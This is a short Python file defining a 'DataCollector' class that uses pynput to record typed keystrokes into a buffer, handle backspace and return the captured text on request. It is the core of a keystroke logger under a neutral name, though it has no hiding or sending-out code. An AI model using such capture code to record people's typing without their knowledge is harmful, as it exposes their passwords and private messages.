from pynput import keyboard

class DataCollector:
    def __init__(self):
        self.text = ""
    
    def collect_data(self, key):
        if key == keyboard.Key.enter:
            pass
        elif key == keyboard.Key.tab:
            pass
        elif key == keyboard.Key.space:
            self.text += " "
        elif key == keyboard.Key.shift_r:
            pass
        elif key == keyboard.Key.shift_l:
            pass
        elif key == keyboard.Key.alt:
            pass
        elif key == keyboard.Key.ctrl:
            pass
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.cmd:
            pass
        elif key == keyboard.Key.caps_lock:
            pass
        elif key == keyboard.Key.right:
            pass
        elif key == keyboard.Key.left:
            pass
        elif key == keyboard.Key.down:
            pass
        elif key == keyboard.Key.up:
            pass
        elif key == keyboard.Key.backspace and len(self.text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(self.text) > 0:
            self.text = self.text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            self.text += str(key).strip("'")

    def get_data(self):
        current_text = self.text
        self.clean_data()
        return current_text

    def clean_data(self):
        self.text = ""
